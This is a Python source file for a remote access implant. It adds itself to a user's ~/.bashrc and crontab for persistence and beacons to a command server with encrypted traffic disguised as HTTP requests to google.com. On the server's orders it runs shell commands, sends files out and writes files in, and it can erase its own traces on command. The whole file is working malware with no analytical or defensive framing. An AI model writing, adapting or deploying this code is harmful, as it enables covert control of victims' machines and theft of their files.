# implant.py
import os as _o
import socket as _s
import platform as _p
import subprocess as _sp
import time as _t
import random as _r
import base64
from aes_helper import encrypt_msg, decrypt_msg, derive_key
from PIL import Image
import io

_KEY_PHRASE = "project_secret"
_KEY = derive_key(_KEY_PHRASE)
_SRV = ("127.0.0.1", 4433)

def _persist():
    import getpass as _gp
    _user = _gp.getuser()
    _home = _o.path.expanduser("~")
    _bashrc = _o.path.join(_home, ".bashrc")
    _cron_cmd = f"*/10 * * * * python3 {_o.path.realpath(__file__)}\n"

    # Inject into ~/.bashrc
    try:
        with open(_bashrc, "r") as f:
            _lines = f.read()
        if "implant.py" not in _lines:
            with open(_bashrc, "a") as f:
                f.write(f"\n# Autostart implant\npython3 {_o.path.realpath(__file__)} &\n")
    except Exception:
        pass

    # Add cron job (overwrite-safe)
    try:
        _existing = _sp.check_output(f"crontab -l -u {_user}", shell=True).decode()
    except:
        _existing = ""
    if "implant.py" not in _existing:
        _new = _existing.strip() + "\n" + _cron_cmd
        _sp.run(f"(echo '{_new}') | crontab -u {_user} -", shell=True)


def _cleanup():
    import sys as _sys
    import getpass as _gp

    _f = _o.path.realpath(__file__)
    _user = _gp.getuser()

    try:
        _o.remove(_f)  # Remove the implant file
    except Exception:
        pass

    # Remove crontab entry if we set one
    try:
        _crons = _sp.check_output(f"crontab -l -u {_user}", shell=True).decode()
        _lines = [l for l in _crons.split("\n") if "implant.py" not in l]
        _new_crons = "\n".join(_lines)
        _sp.run(f"(echo '{_new_crons}') | crontab -u {_user} -", shell=True)
    except Exception:
        pass

    # Remove .bashrc persistence
    try:
        _bashrc_path = _o.path.expanduser("~/.bashrc")
        with open(_bashrc_path, "r") as f:
            _lines = [l for l in f.readlines() if "implant.py" not in l]
        with open(_bashrc_path, "w") as f:
            f.writelines(_lines)
    except Exception:
        pass

    _sys.exit(0)

def _embed_in_image(data: str) -> bytes:
    bin_data = ''.join(f"{ord(c):08b}" for c in data)
    img = Image.new('RGB', (300, 300), color='white')
    pixels = img.load()
    idx = 0

    for y in range(img.height):
        for x in range(img.width):
            r, g, b = [255] * 3
            if idx < len(bin_data): r = (r & ~1) | int(bin_data[idx]); idx += 1
            if idx < len(bin_data): g = (g & ~1) | int(bin_data[idx]); idx += 1
            if idx < len(bin_data): b = (b & ~1) | int(bin_data[idx]); idx += 1
            pixels[x, y] = (r, g, b)
            if idx >= len(bin_data): break
        if idx >= len(bin_data): break

    buf = io.BytesIO()
    img.save(buf, format='PNG')
    return buf.getvalue()


def _wrap_http(data: str) -> bytes:
    body = f"data={data}"
    req = (
        "POST /update HTTP/1.1\r\n"
        f"Host: google.com\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "\r\n" + body
    )
    return req.encode()

def _unwrap_http(raw: bytes) -> str:
    try:
        body = raw.split(b"\r\n\r\n", 1)[1].decode()
        return body.split("data=", 1)[1]
    except Exception:
        return ""

def _get_sysinfo():
    return f"{_p.node()}|{_p.system()}|{_p.release()}"

def _exec(cmd):
    try:
        return _sp.check_output(cmd, shell=True).decode()
    except Exception as _e:
        return str(_e)

def _main_loop():
    while True:
        try:
            with _s.socket(_s.AF_INET, _s.SOCK_STREAM) as _c:
                _c.connect(_SRV)
                _c.send(_wrap_http(encrypt_msg(_get_sysinfo(), _KEY)))
                _resp = _c.recv(8192)
                _cmd = decrypt_msg(_unwrap_http(_resp), _KEY)

                if _cmd == "exit":
                    break
                elif _cmd == "cleanup":
                    _cleanup()
                elif _cmd.startswith("download:"):
                    _fn = _cmd.split(":", 1)[1]
                    try:
                        with open(_fn, "rb") as f:
                            _data = f.read()
                        _c.send(_wrap_http(encrypt_msg(base64.b64encode(_data).decode(), _KEY).encode()))
                    except Exception as e:
                        _c.send(_wrap_http(encrypt_msg(str(e), _KEY).encode()))

                elif _cmd.startswith("upload:"):
                    _fn = _cmd.split(":", 1)[1]
                    _c.send(_wrap_http(encrypt_msg("ready", _KEY).encode()))
                    _recv = _c.recv(8192)
                    try:
                        _data = base64.b64decode(decrypt_msg(_recv.decode(), _KEY))
                        with open(_fn, "wb") as f:
                            f.write(_data)
                        _c.send(_wrap_http(encrypt_msg("upload successful", _KEY).encode()))
                    except Exception as e:
                        _c.send(_wrap_http(encrypt_msg(str(e), _KEY).encode()))
                else:
                    _out = _exec(_cmd)
                    _c.send(_wrap_http(encrypt_msg(_out, _KEY).encode()))

        except Exception:
            pass
        _t.sleep(_r.randint(10, 30))


if __name__ == "__main__":
    _persist()
    _main_loop()
